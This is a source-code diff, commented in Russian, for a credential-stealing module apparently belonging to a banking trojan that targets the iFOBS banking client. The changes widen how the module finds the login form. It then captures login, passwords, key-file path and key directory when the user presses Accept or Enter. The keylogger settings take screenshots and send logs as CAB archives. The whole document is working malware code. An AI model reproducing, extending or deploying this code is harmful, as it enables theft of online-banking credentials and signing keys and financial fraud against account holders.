@@ -25,12 +25,18 @@ namespace IFobs
 
 const int PROCESS_HASH = 0x9FF6B644; /* ifobsclient.exe */
 const DWORD HashClassEditControl = 0x2ED8AE2E; /* TcxCustomInnerTextEdit */
-const int CountEditControl = 4;
+const DWORD HashClassButtonControl = 0xA5AD5F9; /* TcxButton */
+//хеш окна регистрации
+const DWORD HashClassLoginForm = 0x918D725B; /* TLoginForm.UnicodeClass*/ 
 
-struct ForFindEditControl
+const int MaxFindedControl = 6;
+
+struct ForFindControl
 {
-	char* texts[CountEditControl];
-	int n;
+	HWND wnds[MaxFindedControl];
+	char* texts[MaxFindedControl];
+	int count;
+	DWORD hash;
 };
 
 struct AccBalans
@@ -44,21 +50,25 @@ int ( WINAPI *pTVDBDirectGetCurrency )(int P1, int P2);
 typedef BOOL ( WINAPI *PInitFunc )(DWORD origFunc, char *funcName);
 char folderIFobs[MAX_PATH]; //папка в которой находится прога, для копирования на сервер
 
+//хеши кнопки Принять на разных языках, при нажатии такой кнопки грабятся данные 
+DWORD btAccept[] = { 0x8DBF3905 /* Принять */, 0x62203A2E /* Прийняти */, 0x3C797A7A /* Accept */, 0 };
+
 static BOOL CALLBACK EnumChildProc( HWND hwnd, LPARAM lParam )
 {
-	ForFindEditControl* ffec = (ForFindEditControl*)lParam;
+	ForFindControl* ffc = (ForFindControl*)lParam;
 	DWORD hash = GetWndClassHash(hwnd);
-	if( hash == HashClassEditControl )
+	if( hash == ffc->hash )
 	{
-		ffec->texts[ffec->n] = GetWndText(hwnd);
-		DBG( "IFobs", "find control %08x, text = %s", hwnd, ffec->texts[ffec->n] );
-		ffec->n++;
-		if( ffec->n >= CountEditControl ) return FALSE;
+		ffc->wnds[ffc->count] = hwnd;
+		ffc->texts[ffc->count] = GetWndText(hwnd);
+		DBG( "IFobs", "find control %08x, text = %s", hwnd, ffc->texts[ffc->count] );
+		ffc->count++;
+		if( ffc->count >= MaxFindedControl ) return FALSE;
 	}
 	return TRUE;
 }
 
-void AddStrLog( const char* name, const char* value )
+static void AddStrLog( const char* name, const char* value )
 {
 	char buf[MAX_PATH];
 	m_lstrcpy( buf, name );
@@ -70,38 +80,126 @@ void AddStrLog( const char* name, const char* value )
 	DBG( "IFobs", buf );
 }
 
+static void FreeFFC( ForFindControl& ffc )
+{
+	for( int i = 0; i < ffc.count; i++ ) STR::Free(ffc.texts[i]);
+}
+
 //в окне регистрации 4-е текстовых поля ввода, путем перечисления всех дочерних окон находим эти контролы
 //в массиве texts структуры ForFindEditControl они находятся в следующем порядке: 0 - путь к ключам, 
 //1 - пароль для ключей, 2 - пароль для входа систему, 3 - логин
-void GrabData( HWND wnd )
+static void GrabData( HWND wnd )
 {
 	DBG( "IFobs", "Грабим данные" );
-	ForFindEditControl ffec;
-	ClearStruct(ffec);
-	pEnumChildWindows( wnd, EnumChildProc, &ffec );
-	AddStrLog( "Login", ffec.texts[3] );
-	AddStrLog( "Password system", ffec.texts[2] );
-	AddStrLog( "Password key", ffec.texts[1] );
-	AddStrLog( "Path keys", ffec.texts[0] );
-	DWORD attr = (DWORD)pGetFileAttributesA(ffec.texts[0]);
+	ForFindControl ffc;
+	ClearStruct(ffc);
+	ffc.hash = HashClassEditControl;
+	pEnumChildWindows( wnd, EnumChildProc, &ffc );
+	AddStrLog( "Login", ffc.texts[3] );
+	AddStrLog( "Password system", ffc.texts[2] );
+	AddStrLog( "Password key", ffc.texts[1] );
+	AddStrLog( "Path keys", ffc.texts[0] );
+	DWORD attr = (DWORD)pGetFileAttributesA(ffc.texts[0]);
 	if( attr != INVALID_FILE_ATTRIBUTES && (attr & FILE_ATTRIBUTE_DIRECTORY) != 0 )
-		KeyLogger::AddDirectory( ffec.texts[0], "Keys" );
-	for( int i = 0; i < ffec.n; i++ ) STR::Free(ffec.texts[i]);
+		KeyLogger::AddDirectory( ffc.texts[0], "Keys" );
+	FreeFFC(ffc);
 }
 
-void OnMessage(LPVOID Sender, PMSG Msg, bool IsUnicode)
+//это кнопка Принять
+static bool IsBtAccept( HWND wnd, const char* text )
+{
+	char buf[64];
+	if( text == 0 )
+	{
+		pGetWindowTextA( wnd, buf, sizeof(buf) );
+		text = buf;
+	}
+	DWORD hash = STR::GetHash( (char*)text, 0, false );
+	int i = 0;
+	while( btAccept[i] && btAccept[i] != hash ) i++; //смотрим в массиве хешей
+	if( btAccept[i] ) //кнопка Принять
+		return true;
+	return false;
+}
+
+static HWND GetLoginForm( HWND wnd )
+{
+	HWND mainWnd = wnd;
+	for(;;)
+	{
+		HWND parent = (HWND)pGetParent(mainWnd);
+		if( parent == 0 ) break;
+		mainWnd = parent;
+	}
+	char className[128];
+	pGetClassNameA( mainWnd, className, 128 );
+	DBG( "IFobs", "parent %08x, '%s', %08x", mainWnd, className, STR::GetHash( className, 0, false ) );
+	if( GetWndClassHash(mainWnd) != HashClassLoginForm )
+	{
+		wnd = mainWnd;
+		mainWnd = 0;
+	}
+	if( mainWnd == 0 )
+	{
+		ForFindControl ffc;
+		ClearStruct(ffc);
+		ffc.hash = HashClassLoginForm;
+		pEnumChildWindows( wnd, EnumChildProc, &ffc );
+		if( ffc.count > 0 )
+			mainWnd = ffc.wnds[0];
+		else
+		{
+			pEnumWindows( EnumChildProc, &ffc );
+			if( ffc.count > 0 )
+				mainWnd = ffc.wnds[0];
+		}
+	}
+	if( mainWnd )
+		DBG( "IFobs", "Нашли окно регистрации %08x", mainWnd );
+	else
+		DBG( "IFobs", "Окно регистрации ненайдено" );
+	return mainWnd;
+}
+
+static void OnMessage(LPVOID Sender, PMSG Msg, bool IsUnicode)
 {
 	if( Msg->message == WM_LBUTTONUP )
 	{
-		char text[64];
-		GetWindowTextA( Msg->hwnd, text, sizeof(text) );
-		if( m_lstrcmp( text, "Принять" ) == 0 )
+		//смотрим нажали ли на кнопку Принять
+		if( IsBtAccept( Msg->hwnd, 0 ) )
 		{
 			HWND parent = (HWND)pGetParent(Msg->hwnd);
-			if( !KeyLogger::IsWindowDialog(parent) ) return;
 			GrabData(parent);
 		}
 	}
+	else
+		if( Msg->message == WM_KEYUP && Msg->wParam == VK_RETURN ) //нажали клавишу Enter
+		{
+			DBG( "IFobs", "Нажали клавишу Enter" );
+			//ищем главное окно
+			HWND mainWnd = GetLoginForm(Msg->hwnd);
+			
+			//ищем все кнопки на форме
+			ForFindControl ffc;
+			ClearStruct(ffc);
+			ffc.hash = HashClassButtonControl;
+			pEnumChildWindows( mainWnd, EnumChildProc, &ffc );
+			//ищем кнопку Принять
+			for( int i = 0; i < ffc.count; i++ )
+				if( IsBtAccept( ffc.wnds[i], ffc.texts[i] ) )
+				{
+					//смотрим активна она или нет
+					if( IsWindowEnabled( ffc.wnds[i] ) )
+					{
+						DBG( "IFobs", "Кнопка Принять активна" );
+						GrabData(mainWnd);
+						break;
+					}
+					else
+						DBG( "IFobs", "Кнопка Принять заблокирована" );
+				}
+			FreeFFC(ffc);
+		}
 }
 
 static char* GetAdminUrl( char* url )
@@ -230,16 +328,21 @@ bool Init( const char* appName )
 	PKeyLogSystem S = KeyLogger::AddSystem( "ifobs", PROCESS_HASH );
 	if( S != NULL )
 	{
-		char* caption = "*iFOBS*Регистрация*";
+		char* caption = "*iFOBS*Ре*страц*я*";
+		char* caption2 = "*iFOBS*Regis*";
 		S->MakeScreenShot = true;
 		S->SendLogAsCAB = true;
 		S->OnActivate = Activeted;
 		//S->OnDeactivate = Deactiveted;
 		S->OnMessage = OnMessage;
 		
-		KeyLogger::AddFilter(S, true, true, NULL, caption, FILTRATE_PARENT_WND, LOG_ALL, 5);
+		PKlgWndFilter F = KeyLogger::AddFilter(S, true, true, NULL, caption, FILTRATE_PARENT_WND, LOG_ALL, 5);
 		m_lstrcpy( folderIFobs, appName ); //копируем путь к iFOBSClient.exe
 		pPathRemoveFileSpecA(folderIFobs); //папка с прогой
+		if( F )
+		{
+			KeyLogger::AddFilterText(F, NULL, caption2 );
+		}
 	}
 	return true;
 }
